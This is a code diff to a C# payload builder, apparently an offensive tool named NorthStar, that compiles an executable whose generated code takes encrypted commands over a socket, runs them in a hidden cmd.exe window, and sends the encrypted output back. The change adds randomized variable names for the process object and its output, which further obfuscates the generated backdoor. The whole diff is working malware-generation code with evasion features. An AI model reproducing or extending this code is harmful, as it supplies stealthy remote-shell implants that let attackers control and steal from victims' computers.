@@ -43,7 +43,9 @@ namespace NorthStar
         private static string obfparam2;
         private static string obfinfparam;
         private static string obfinfvar;
-
+        private static string pvar;
+        private static string exfivo;
+        private static string exfive;
         private static Random random = new Random((int)DateTime.Now.Ticks);
 
 
@@ -101,6 +103,9 @@ namespace NorthStar
             obfparam2 = varGenerate(true);
             obfinfparam = varGenerate(true);
             obfinfvar = varGenerate(true);
+            pvar = varGenerate(true);
+            exfivo = varGenerate(true);
+            exfive = varGenerate(true);
         }
 
 
@@ -174,18 +179,18 @@ if (" + isFirstVar + @")
                 string " + commandVar + @" = Encoding.Default.GetString(" + bufVar + @"); 
  " +commandVar + @" = " + obfunc + @"(" + commandVar + @",""" + textBoxEncrypt.Text + @""");
 
-                    Process p = new Process();
-                    p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                    p.StartInfo.CreateNoWindow = true;
-                    p.StartInfo.FileName = ""cmd.exe"";
-                    p.StartInfo.Arguments = ""/C "" + " + commandVar + @";
-                    p.StartInfo.RedirectStandardOutput = true;
-                    p.StartInfo.RedirectStandardError = true;
-                    p.StartInfo.UseShellExecute = false;
-                    p.Start();
-                    string output = p.StandardOutput.ReadToEnd();
-                    string error = p.StandardError.ReadToEnd();
-                    string " + isLastVar + @" = output + ""\n"" + error;
+                    Process  " + pvar + @" = new Process();
+                    " + pvar + @".StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                    " + pvar + @".StartInfo.CreateNoWindow = true;
+                    " + pvar + @".StartInfo.FileName = ""cmd.exe"";
+                    " + pvar + @".StartInfo.Arguments = ""/C "" + " + commandVar + @";
+                    " + pvar + @".StartInfo.RedirectStandardOutput = true;
+                    " + pvar + @".StartInfo.RedirectStandardError = true;
+                    " + pvar + @".StartInfo.UseShellExecute = false;
+                    " + pvar + @".Start();
+                    string " + exfivo + @" = " + pvar + @".StandardOutput.ReadToEnd();
+                    string " + exfive + @" = " + pvar + @".StandardError.ReadToEnd();
+                    string " + isLastVar + @" =" + exfivo + @" + ""\n"" + " + exfive + @";
 " + isLastVar + @" = " + obfunc + @"(" + isLastVar + @",""" + textBoxEncrypt.Text + @""");
                     byte[] " + lasteVar + @" = Encoding.Default.GetBytes(" + isLastVar + @");
                     " + sckVar + @".Send(" + lasteVar + @", 0, " + lasteVar + @".Length, 0);
@@ -353,6 +358,7 @@ if (" + isFirstVar + @")
                 parameters.ReferencedAssemblies.Add("System.dll");
                 parameters.GenerateExecutable = true;
                 parameters.OutputAssembly = path + "\\" + textBoxExeName.Text + ".exe";
+
                 CompilerResults results = icc.CompileAssemblyFromSource(parameters, payload);
                 if (results.Errors.Count < 1)
                 {
